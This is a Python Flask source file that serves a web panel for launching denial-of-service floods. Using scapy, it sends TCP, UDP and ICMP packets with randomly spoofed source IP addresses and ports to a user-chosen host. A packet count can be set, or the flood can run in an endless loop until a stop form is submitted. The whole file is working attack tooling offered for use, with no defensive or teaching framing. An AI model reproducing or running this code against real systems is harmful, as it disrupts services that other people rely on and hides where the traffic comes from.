from flask import Flask, render_template, request
import random
import socket
from scapy.all import *

app = Flask(__name__)

numbers = [str(num) for num in range(0,11)]
counter_ = 0


# GET Requests

@app.route('/tcp_packet', methods = ['GET']) # Completed.
def tcpPacket():
    return render_template('tcp_packet.html')

@app.route('/udp_packet', methods = ['GET'])
def udpPacket():
    return render_template('udp_packet.html')

@app.route('/icmp_packet', methods = ['GET'])
def icmpPacket():
    return render_template('icmp_packet.html')




# POST Requests


# TCP Packet Attack

@app.route('/tcp_packet_result', methods = ['GET','POST'])
def tcpPacketGetValues():
    if request.method == 'POST':
        destIPorDomain = request.form['ip_or_domain']
        destPort = request.form['destPort']
        attackSize = request.form['attackSize']
        number_Of_Packages_To_Go = request.form['number_Of_Packages_To_Go']
        
        if int(destPort) < 0:
            return 'Destination port number cannot be less than 0 and 0.'
        if int(destPort) > 65535:
            return 'Destination port and source port number cannot be greater than 65535.'

        if int(attackSize) > 5954:
            return 'Attack Size cannot be greater than 5954.'
        else:
            if(destIPorDomain == '' or destPort == '' or attackSize == ''):
                return 'Error: Do not leave the fields blank.'
            else:
                if number_Of_Packages_To_Go.upper() == 'T':
                    tcpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,destPort=destPort,attackSize=attackSize,number_Of_Packages_To_Go=number_Of_Packages_To_Go)
                else:
                    res = tcpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,destPort=destPort,attackSize=attackSize,number_Of_Packages_To_Go=number_Of_Packages_To_Go)

                    return res 
    else:
        return 'For post requests only.'
                        

@app.route('/tcp_packet_stop', methods = ['GET','POST'])
def tcpPacketStop():
    if request.method == 'POST':
        stopy = request.form['tcp_packet_stop']  
        if(stopy == ''):
            return 'Please type E or H, do not leave the fields blank.'
        else:
            if(stopy.upper() == 'Y'):
                tcpPacketStopResult(stop_s=stopy,destIPor_Domain='',destPort=1,attackSize=1,number_Of_Packages_To_Go='T')
                return 'TCP packet attack aborted successfully. Total of {0} packages sent.'.format(counter_)
            else:
                return 'Currently Attack Continues'
    else:
        return 'For post requests only.'


def tcpPacketStopResult(stop_s,destIPor_Domain,destPort,attackSize,number_Of_Packages_To_Go):
    global stop_
    global counter_

    if stop_s.upper() == 'Y':
        stop_ = stop_s.upper()
    else:
        len_ = destIPor_Domain.split('.')
        if len(len_) == 4 and destIPor_Domain[0].isalpha():
            destIPor_Domain = socket.gethostbyname(destIPor_Domain)
        else:
            if destIPor_Domain[0] in numbers:
                pass
            else:
                try:
                    destIPor_Domain = socket.gethostbyname(destIPor_Domain)
                except:
                    return 'Please provide a valid url.'

        if number_Of_Packages_To_Go.upper() == 'T':
            payload = 'xxx xxx xxx' * int(attackSize)
            stop_ = stop_s.upper()
            counter_ = 0
            while True:
                srcPort = int("%i"%(random.randint(1,65535)))
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain)
                transportLayer = TCP(sport = int(srcPort),dport = int(destPort))
                spoofedPacket = networkLayer / transportLayer / payload
                if stop_ == 'Y':
                    break
                counter_+=1
                send(spoofedPacket)
        else:
            payload = 'xxx xxx xxx' * int(attackSize)
            stop_ = stop_s.upper()
            counter_ = 0
            for i in range(int(number_Of_Packages_To_Go)):
                srcPort = int("%i"%(random.randint(1,65535)))
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain)
                transportLayer = TCP(sport = int(srcPort),dport = int(destPort))
                spoofedPacket = networkLayer / transportLayer / payload
                if stop_ == 'Y':
                    break
                counter_+=1
                send(spoofedPacket)

            return 'TCP packet attack completed successfully. Total of {0} packages sent.'.format(counter_)




# UDP Packet Attack

@app.route('/udp_packet_result', methods = ['GET','POST'])
def udpPacketGetValues():
    if request.method == 'POST':
        destIPorDomain = request.form['ip_or_domain']
        destPort = request.form['destPort']
        attackSize = request.form['attackSize']
        number_Of_Packages_To_Go = request.form['number_Of_Packages_To_Go']
        
        if int(destPort) < 0:
            return 'Destination port number cannot be less than 0 and 0.'
        if int(destPort) > 65535:
            return 'Destination port and source port number cannot be greater than 65535.'

        if int(attackSize) > 5954:
            return 'Attack Size cannot be greater than 5954.'
        else:
            if(destIPorDomain == '' or destPort == '' or attackSize == ''):
                return 'Error: Do not leave the fields blank.'
            else:
                if number_Of_Packages_To_Go.upper() == 'T':
                    udpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,destPort=destPort,attackSize=attackSize,number_Of_Packages_To_Go=number_Of_Packages_To_Go)
                else:
                    res = udpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,destPort=destPort,attackSize=attackSize,number_Of_Packages_To_Go=number_Of_Packages_To_Go)

                    return res 
    else:
        return 'For post requests only.'


@app.route('/udp_packet_stop', methods = ['GET','POST'])
def udpPacketStop():
    if request.method == 'POST':
        stopy = request.form['udp_packet_stop']  
        if(stopy == ''):
            return 'Please type E or H, do not leave the fields blank.'
        else:
            if(stopy.upper() == 'Y'):
                udpPacketStopResult(stop_s=stopy,destIPor_Domain='',destPort=1,attackSize=1,number_Of_Packages_To_Go='T')
                return 'UDP packet attack aborted successfully. Total of {0} packages sent.'.format(counter_)
            else:
                return 'Currently Attack Continues'
    else:
        return 'For post requests only.'


def udpPacketStopResult(stop_s,destIPor_Domain,destPort,attackSize,number_Of_Packages_To_Go):
    global stop_
    global counter_

    if stop_s.upper() == 'Y':
        stop_ = stop_s.upper()
    else:
        len_ = destIPor_Domain.split('.')
        if len(len_) == 4 and destIPor_Domain[0].isalpha():
            destIPor_Domain = socket.gethostbyname(destIPor_Domain)
        else:
            if destIPor_Domain[0] in numbers:
                pass
            else:
                try:
                    destIPor_Domain = socket.gethostbyname(destIPor_Domain)
                except:
                    return 'Please provide a valid url.'

        if number_Of_Packages_To_Go.upper() == 'T':
            payload = 'xxx xxx xxx' * int(attackSize)
            stop_ = stop_s.upper()
            counter_ = 0
            while True:
                srcPort = int("%i"%(random.randint(1,65535)))
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain)
                transportLayer = UDP(sport = int(srcPort),dport = int(destPort))
                spoofed_packet = networkLayer / transportLayer / payload
                if stop_ == 'Y':
                    break
                counter_+=1
                send(spoofed_packet)
        else:
            payload = 'xxx xxx xxx' * int(attackSize)
            stop_ = stop_s.upper()
            counter_ = 0
            for i in range(int(number_Of_Packages_To_Go)):
                srcPort = int("%i"%(random.randint(1,65535)))
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain)
                transportLayer = UDP(sport = int(srcPort),dport = int(destPort))
                spoofed_packet = networkLayer / transportLayer / payload
                if stop_ == 'Y':
                    break
                counter_+=1
                send(spoofed_packet)

            return 'UDP packet attack completed successfully. Total of {0} packages sent.'.format(counter_)




# ICMP Packet Attack

@app.route('/icmp_packet_result', methods = ['GET','POST'])
def icmpPacketGetValues():
    if request.method == 'POST':
        destIPorDomain = request.form['ip_or_domain']
        number_Of_Packages_To_Go = request.form['number_Of_Packages_To_Go']
        
        if(destIPorDomain == ''):
            return 'Error: Do not leave the fields blank.'
        else:
            if number_Of_Packages_To_Go.upper() == 'T':
                icmpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,number_Of_Packages_To_Go=number_Of_Packages_To_Go)
            else:
                res = icmpPacketStopResult(stop_s = '', destIPor_Domain=destIPorDomain,number_Of_Packages_To_Go=number_Of_Packages_To_Go)
                return res 
    else:
        return 'For post requests only.'


@app.route('/icmp_packet_stop', methods = ['GET','POST'])
def icmpPacketStop():
    if request.method == 'POST':
        stopy = request.form['icmp_packet_stop']  
        if(stopy == ''):
            return 'Please type E or H, do not leave the fields blank.'
        else:
            if(stopy.upper() == 'Y'):
                icmpPacketStopResult(stop_s=stopy,destIPor_Domain='',number_Of_Packages_To_Go='T')
                return 'ICMP packet attack aborted successfully. Total of {0} packages sent.'.format(counter_)
            else:
                return 'Currently Attack Continues'
    else:
        return 'For post requests only.'


def icmpPacketStopResult(stop_s,destIPor_Domain,number_Of_Packages_To_Go):
    global stop_
    global counter_

    if stop_s.upper() == 'Y':
        stop_ = stop_s.upper()
    else:
        len_ = destIPor_Domain.split('.')
        if len(len_) == 4 and destIPor_Domain[0].isalpha():
            destIPor_Domain = socket.gethostbyname(destIPor_Domain)
        else:
            if destIPor_Domain[0] in numbers:
                pass
            else:
                try:
                    destIPor_Domain = socket.gethostbyname(destIPor_Domain)
                except:
                    return 'Please provide a valid url.'

        if number_Of_Packages_To_Go.upper() == 'T':
            stop_ = stop_s.upper()
            counter_ = 0
            while True:
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain) / ICMP()
                if stop_ == 'Y':
                    break
                counter_+=1
                send(networkLayer)
        else:
            stop_ = stop_s.upper()
            counter_ = 0
            for i in range(int(number_Of_Packages_To_Go)):
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                networkLayer = IP(src = srcIP,dst = destIPor_Domain) / ICMP()
                if stop_ == 'Y':
                    break
                counter_+=1
                send(networkLayer)

            return 'ICMP packet attack completed successfully. Total of {0} packages sent.'.format(counter_)


if __name__ == '__main__':
    app.run(debug=True, port=5000)
